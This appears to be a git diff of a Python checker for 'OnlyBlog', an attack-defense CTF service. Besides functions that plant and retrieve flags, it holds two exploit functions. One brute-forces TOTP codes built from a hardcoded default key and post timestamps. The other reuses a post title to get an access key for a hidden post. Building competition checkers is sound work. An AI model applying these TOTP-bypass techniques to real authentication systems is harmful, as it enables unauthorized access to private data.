@@ -31,13 +31,302 @@ from enochecker3.utils import FlagSearcher, assert_equals, assert_in
 from httpx import AsyncClient, Request, Response
 
 """
-
+START CONFIG
 """
+
 SERVICE_PORT = 5000
 checker = Enochecker("OnlyBlog", SERVICE_PORT)
 app = lambda: checker.app
+
+"""
+END CONFIG
 """
 
+"""
+START PUTFLAG
+"""
+
+# Deposit a flag in a private user post.
+# Puts the post title attackinfgo
+@checker.putflag(0)
+async def putflag_zero(
+    task: PutflagCheckerTaskMessage,
+    logger: LoggerAdapter,
+    client: AsyncClient,
+    db: ChainDB,
+) -> str:
+
+    flag = task.flag
+    author, apassword = await register_user(client, logger)
+    authorcookie = await login_user(client, logger, author, apassword)
+    user_to_invite, upassword = await register_user(client, logger)
+
+    title, secret = await create_blogpost(client, logger, authorcookie, flag, is_private=True, is_hidden=False, inviteduser=user_to_invite, title="")
+    await logout_user(client, logger, author, authorcookie)
+
+    await db.set("nec_info", (title, user_to_invite, upassword))
+    return str(title)
+
+# Deposit a flag in a hidden user post.
+@checker.putflag(1)
+async def putflag_one(
+    task: PutflagCheckerTaskMessage,
+    logger: LoggerAdapter,
+    client: AsyncClient,
+    db: ChainDB,
+) -> str:
+
+    flag = task.flag
+    author, apassword = await register_user(client, logger)
+    authorcookie = await login_user(client, logger, author, apassword)
+    user_to_invite, upassword = await register_user(client, logger)
+
+    title, secret, postid= await create_blogpost(client, logger, authorcookie, flag, is_private=False, is_hidden=True, inviteduser=user_to_invite, title="")
+    await logout_user(client, logger, author, authorcookie)
+
+    await db.set("nec_info", (title, user_to_invite, upassword, secret))
+    return str(postid)
+
+"""
+END PUTFLAG
+"""
+
+"""
+START NOISE
+"""
+
+@checker.putnoise(0)
+async def putnoise_register(
+        db: ChainDB,
+        client: AsyncClient,
+        logger: LoggerAdapter
+) -> None:
+    username, password = await register_user(client, logger)
+    await db.set("reg_info", (username, password))
+
+
+@checker.getnoise(0)
+async def getnoise_login_logout(
+        db: ChainDB,
+        client: AsyncClient,
+        logger: LoggerAdapter
+) -> None:
+
+    try:
+        username, password = await db.get("reg_info")
+    except KeyError:
+        raise MumbleException("Missing database entry from putflag operation.")
+
+    cookie = await login_user(client, logger, username, password)
+    r = await client.get('/auth/accountInfo', cookies=cookie)
+    assert_equals(r.status_code, 200, "User unable to access acount Information")
+
+
+#@checker.putnoise(1)
+#async def putnoise_cre(
+#        db: ChainDB,
+#        client: AsyncClient,
+#        logger: LoggerAdapter
+#) -> None:
+#    username, password = await register_user(client, logger)
+#    await db.set("reg_info", (username, password))
+#
+#
+#@checker.getnoise(1)
+#async def getnoise_login_logo(
+#        db: ChainDB,
+#        client: AsyncClient,
+#        logger: LoggerAdapter
+#) -> None:
+#
+#    try:
+#        username, password = await db.get("reg_info")
+#    except KeyError:
+#        raise MumbleException("Missing database entry from putflag operation.")
+#
+#    cookie = await login_user(client, logger, username, password)
+#    r = await client.get('/auth/accountInfo', cookies=cookie)
+#    assert_equals(r.status_code, 200, "User unable to access acount Information")
+
+"""
+END NOISE
+"""
+
+"""
+START HAVOC
+"""
+
+#@checker.havoc(0)
+#async def havoc():
+#    return
+
+"""
+END HAVOC
+"""
+
+"""
+START GETFLAG
+"""
+
+@checker.getflag(0)
+async def getflag_zero(
+    task: GetflagCheckerTaskMessage,
+    logger: LoggerAdapter,
+    client: AsyncClient,
+    db: ChainDB
+) -> None:
+
+    try:
+        userdata = await db.get("nec_info")
+    except KeyError:
+        #is mumble here correct or will lead to deduction in points?
+        raise MumbleException("Missing database entry from putflag operation.")
+
+    cookie = await login_user(client, logger, username=userdata[1], password=userdata[2])
+    r = await client.get('/auth/accountInfo', cookies=cookie)
+    logger.debug(f"accessing accountinfo: {r.text}")
+    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, userdata[0])
+    timestamp = convert_str_to_unixtimestamp(date, True)
+
+    totp_device = Totp_Client(init_time=timestamp)
+    totp_device.generate_shared_secret(postkey)
+    totp_device.calculate_current_timestep_count()
+    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
+    logger.debug(f"accessing post: {userdata[0]}, timestamp: {timestamp}, usercode: {usercode}")
+
+    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
+    logger.debug(f"response: {r.text}")
+    assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")
+
+    await logout_user(client, logger, userdata[0], cookie)
+    return
+
+@checker.getflag(1)
+async def getflag_one(
+    task: GetflagCheckerTaskMessage,
+    logger: LoggerAdapter,
+    client: AsyncClient,
+    db: ChainDB
+) -> None:
+
+    try:
+        userdata = await db.get("nec_info")
+    except KeyError:
+        #is mumble here correct or will lead to deduction in points?
+        raise MumbleException("Missing database entry from putflag operation.")
+
+    cookie = await login_user(client, logger, username=userdata[1], password=userdata[2])
+    r = await client.get('/auth/accountInfo', cookies=cookie)
+    logger.debug(f"accessing accountinfo: {r.text}")
+    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, userdata[0])
+    timestamp = convert_str_to_unixtimestamp(date, True)
+
+    totp_device = Totp_Client(init_time=timestamp)
+    totp_device.generate_shared_secret(postkey)
+    totp_device.calculate_current_timestep_count()
+    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
+    logger.debug(f"accessing post: {userdata[0]}, timestamp: {timestamp}, usercode: {usercode}")
+
+    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
+    logger.debug(f"response: {r.text}")
+    assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")
+
+    await logout_user(client, logger, userdata[0], cookie)
+    return
+
+"""
+END GETFFLAG
+"""
+
+"""
+START EXPLOIT
+"""
+
+@checker.exploit(0)
+async def exploit_zero(task: ExploitCheckerTaskMessage,
+                       searcher: FlagSearcher,
+                       client: AsyncClient,
+                       logger: LoggerAdapter
+                       ) -> Optional[str]:
+
+    if task.attack_info == "":
+        raise InternalErrorException("Missing attack info for exploit")
+    title = task.attack_info
+
+    username, password  = await register_user(client, logger)
+    cookie = await login_user(client, logger, username, password)
+    r = await client.get("/", cookies=cookie)
+
+    # use the title to find relevant info
+    time, posturl = finddata_for_exploit(r, username, title)
+    default_key = "Correct horse battery staple!"
+    #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
+    timestamp = int(convert_str_to_unixtimestamp(time, False))
+    totp_device = Totp_Client(init_time=timestamp)
+    totp_device.generate_shared_secret(default_key)
+    totp_device.calculate_current_timestep_count()
+
+    rangep = int(60/totp_device.timestep)
+    for i in range(rangep+1):
+        usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
+        r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
+        logger.debug(f"response: {r.text}")
+        if flag := searcher.search_flag(r.text):
+            return flag
+
+        totp_device.init_time = totp_device.init_time+totp_device.timestep
+        totp_device.calculate_current_timestep_count()
+
+    raise MumbleException("Flag not found in exploit")
+
+@checker.exploit(1)
+async def exploit_one(task: ExploitCheckerTaskMessage,
+                       searcher: FlagSearcher,
+                       client: AsyncClient,
+                       logger: LoggerAdapter
+                       ) -> Optional[str]:
+
+    if task.attack_info == "":
+        raise InternalErrorException("Missing attack info for exploit")
+    postid = task.attack_info
+
+    inviter, ipassword  = await register_user(client, logger)
+    guest, gpassword = await register_user(client, logger)
+
+    cookie = await login_user(client, logger, inviter, ipassword)
+    r = await client.get("/auth/accessblogpost/"+str(postid), cookies=cookie)
+    html = BeautifulSoup(r.text, "html.parser")
+    content = html.find('section', attrs={"class":"content"})
+    heading = content.find('h1').string
+    title = heading.split(' ')[0]
+    logger.debug(f"the title is: {title}")
+    title, secret = await create_blogpost(client, logger, cookie, "some text", is_private=True, is_hidden=False, inviteduser=guest, title=title, isexploit=True)
+    await logout_user(client, logger, inviter, cookie)
+
+    guestcookie = await login_user(client, logger, guest, gpassword)
+    r = await client.get('/auth/accountInfo', cookies=guestcookie)
+    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, title)
+
+    #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
+    timestamp = int(convert_str_to_unixtimestamp(date, True))
+    totp_device = Totp_Client(init_time=timestamp)
+    totp_device.generate_shared_secret(postkey)
+    totp_device.calculate_current_timestep_count()
+    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
+
+    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
+    logger.debug(f"response: {r.text}")
+    if flag := searcher.search_flag(r.text):
+        return flag
+
+    raise MumbleException("Flag not found in exploit")
+
+"""
+END EXPLOIT
+"""
+
+"""
+START UTILITY
 """
 
 class Totp_Client:
@@ -157,91 +446,12 @@ async def create_blogpost(client, logger, cookie, flag, is_private, is_hidden, i
 
     return title, secret
 
+
 async def logout_user(client, logger, username, cookie):
     r = await client.get('auth/logout', cookies=cookie)
     logger.debug(f"logged out: {username}")
     assert_equals(r.status_code, 302, "Logout did not redirect to index")
     return
-
-# Deposit a flag in a private user post.
-# Puts the post title attackinfgo
-@checker.putflag(0)
-async def putflag_zero(
-    task: PutflagCheckerTaskMessage,
-    logger: LoggerAdapter,
-    client: AsyncClient,
-    db: ChainDB,
-) -> str:
-    """
-    TODO:
-        - register a user and store credentials
-        - login as user with valid username, password
-        - register another user and invite him
-        - create a new blogpost with a valid title, put the flag as the body and make it private
-        - logout
-    """
-    flag = task.flag
-    author, apassword = await register_user(client, logger)
-    authorcookie = await login_user(client, logger, author, apassword)
-    user_to_invite, upassword = await register_user(client, logger)
-
-    title, secret = await create_blogpost(client, logger, authorcookie, flag, is_private=True, is_hidden=False, inviteduser=user_to_invite, title="")
-    await logout_user(client, logger, author, authorcookie)
-
-    await db.set("nec_info", (title, user_to_invite, upassword))
-    return str(title)
-
-# Deposit a flag in a hidden user post.
-@checker.putflag(1)
-async def putflag_one(
-    task: PutflagCheckerTaskMessage,
-    logger: LoggerAdapter,
-    client: AsyncClient,
-    db: ChainDB,
-) -> str:
-    """
-    TODO:
-        - register a user and store credentials
-        - login as user with valid username, password
-        - register another user and invite him
-        - create a new blogpost with a valid title, put the flag as the body and make it private
-        - logout
-    """
-    flag = task.flag
-    author, apassword = await register_user(client, logger)
-    authorcookie = await login_user(client, logger, author, apassword)
-    user_to_invite, upassword = await register_user(client, logger)
-
-    title, secret, postid= await create_blogpost(client, logger, authorcookie, flag, is_private=False, is_hidden=True, inviteduser=user_to_invite, title="")
-    await logout_user(client, logger, author, authorcookie)
-
-    await db.set("nec_info", (title, user_to_invite, upassword, secret))
-    return str(postid)
-
-@checker.putnoise(0)
-async def putnoise_register(
-        db: ChainDB,
-        client: AsyncClient,
-        logger: LoggerAdapter
-) -> None:
-    username, password = await register_user(client, logger)
-    await db.set("reg_info", (username, password))
-
-@checker.getnoise(0)
-async def getnoise_login_logout(
-        db: ChainDB,
-        client: AsyncClient,
-        logger: LoggerAdapter
-) -> None:
-
-    try:
-        username, password = await db.get("reg_info")
-    except KeyError:
-        raise MumbleException("Missing database entry from putflag operation.")
-
-    cookie = await login_user(client, logger, username, password)
-    r = await client.get('/auth/accountInfo', cookies=cookie)
-    assert_equals(r.status_code, 200, "User unable to access acount Information")
 
 def getdata_from_accountinfo(response, client, logger, title):
     try:
@@ -273,80 +483,6 @@ def getdata_from_accountinfo(response, client, logger, title):
         msg = f"post with title {title} could not be found"
         raise MumbleException(msg)
 
-
-"""
-    TODO:
-        - retrieve valid credentials from DB
-        - login as the user and view your account info
-        - find the event with the given title and parse time and key
-        - access the desired post
-        - retrieve the flag from the posts body
-"""
-@checker.getflag(0)
-async def getflag_zero(
-    task: GetflagCheckerTaskMessage,
-    logger: LoggerAdapter,
-    client: AsyncClient,
-    db: ChainDB
-) -> None:
-
-    try:
-        userdata = await db.get("nec_info")
-    except KeyError:
-        #is mumble here correct or will lead to deduction in points?
-        raise MumbleException("Missing database entry from putflag operation.")
-
-    cookie = await login_user(client, logger, username=userdata[1], password=userdata[2])
-    r = await client.get('/auth/accountInfo', cookies=cookie)
-    logger.debug(f"accessing accountinfo: {r.text}")
-    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, userdata[0])
-    timestamp = convert_str_to_unixtimestamp(date, True)
-
-    totp_device = Totp_Client(init_time=timestamp)
-    totp_device.generate_shared_secret(postkey)
-    totp_device.calculate_current_timestep_count()
-    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
-    logger.debug(f"accessing post: {userdata[0]}, timestamp: {timestamp}, usercode: {usercode}")
-
-    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
-    logger.debug(f"response: {r.text}")
-    assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")
-
-    await logout_user(client, logger, userdata[0], cookie)
-    return
-
-@checker.getflag(1)
-async def getflag_one(
-    task: GetflagCheckerTaskMessage,
-    logger: LoggerAdapter,
-    client: AsyncClient,
-    db: ChainDB
-) -> None:
-
-    try:
-        userdata = await db.get("nec_info")
-    except KeyError:
-        #is mumble here correct or will lead to deduction in points?
-        raise MumbleException("Missing database entry from putflag operation.")
-
-    cookie = await login_user(client, logger, username=userdata[1], password=userdata[2])
-    r = await client.get('/auth/accountInfo', cookies=cookie)
-    logger.debug(f"accessing accountinfo: {r.text}")
-    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, userdata[0])
-    timestamp = convert_str_to_unixtimestamp(date, True)
-
-    totp_device = Totp_Client(init_time=timestamp)
-    totp_device.generate_shared_secret(postkey)
-    totp_device.calculate_current_timestep_count()
-    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
-    logger.debug(f"accessing post: {userdata[0]}, timestamp: {timestamp}, usercode: {usercode}")
-
-    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
-    logger.debug(f"response: {r.text}")
-    assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")
-
-    await logout_user(client, logger, userdata[0], cookie)
-    return
 
 #find timestamp and postid for post given by title
 def finddata_for_exploit(r, username, title):
@@ -394,90 +530,3 @@ def convert_str_to_unixtimestamp(time, isstring):
     else:
         raise MumbleException("Unexpected timestamp format!")
 
-
-@checker.exploit(0)
-async def exploit_zero(task: ExploitCheckerTaskMessage,
-                       searcher: FlagSearcher,
-                       client: AsyncClient,
-                       logger: LoggerAdapter
-                       ) -> Optional[str]:
-
-    if task.attack_info == "":
-        raise InternalErrorException("Missing attack info for exploit")
-    title = task.attack_info
-
-    username, password  = await register_user(client, logger)
-    cookie = await login_user(client, logger, username, password)
-    r = await client.get("/", cookies=cookie)
-
-    # use the title to find relevant info
-    time, posturl = finddata_for_exploit(r, username, title)
-    default_key = "Correct horse battery staple!"
-    #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
-    timestamp = int(convert_str_to_unixtimestamp(time, False))
-    totp_device = Totp_Client(init_time=timestamp)
-    totp_device.generate_shared_secret(default_key)
-    totp_device.calculate_current_timestep_count()
-
-    rangep = int(60/totp_device.timestep)
-    for i in range(rangep+1):
-        usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
-        r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
-        logger.debug(f"response: {r.text}")
-        if flag := searcher.search_flag(r.text):
-            return flag
-
-        totp_device.init_time = totp_device.init_time+totp_device.timestep
-        totp_device.calculate_current_timestep_count()
-
-    raise MumbleException("Flag not found in exploit")
-
-@checker.exploit(1)
-async def exploit_one(task: ExploitCheckerTaskMessage,
-                       searcher: FlagSearcher,
-                       client: AsyncClient,
-                       logger: LoggerAdapter
-                       ) -> Optional[str]:
-    """
-    TODO:
-        - register a new user
-        - login as the new user with valid credentials and totp
-        - access the private event by
-            - reading the creation time and creating a timestamp from it
-            - generating the secret key
-            - calculating the totp.
-    """
-    if task.attack_info == "":
-        raise InternalErrorException("Missing attack info for exploit")
-    postid = task.attack_info
-
-    inviter, ipassword  = await register_user(client, logger)
-    guest, gpassword = await register_user(client, logger)
-
-    cookie = await login_user(client, logger, inviter, ipassword)
-    r = await client.get("/auth/accessblogpost/"+str(postid), cookies=cookie)
-    html = BeautifulSoup(r.text, "html.parser")
-    content = html.find('section', attrs={"class":"content"})
-    heading = content.find('h1').string
-    title = heading.split(' ')[0]
-    logger.debug(f"the title is: {title}")
-    title, secret = await create_blogpost(client, logger, cookie, "some text", is_private=True, is_hidden=False, inviteduser=guest, title=title, isexploit=True)
-    await logout_user(client, logger, inviter, cookie)
-
-    guestcookie = await login_user(client, logger, guest, gpassword)
-    r = await client.get('/auth/accountInfo', cookies=guestcookie)
-    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, title)
-
-    #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
-    timestamp = int(convert_str_to_unixtimestamp(date, True))
-    totp_device = Totp_Client(init_time=timestamp)
-    totp_device.generate_shared_secret(postkey)
-    totp_device.calculate_current_timestep_count()
-    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
-
-    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
-    logger.debug(f"response: {r.text}")
-    if flag := searcher.search_flag(r.text):
-        return flag
-
-    raise MumbleException("Flag not found in exploit")
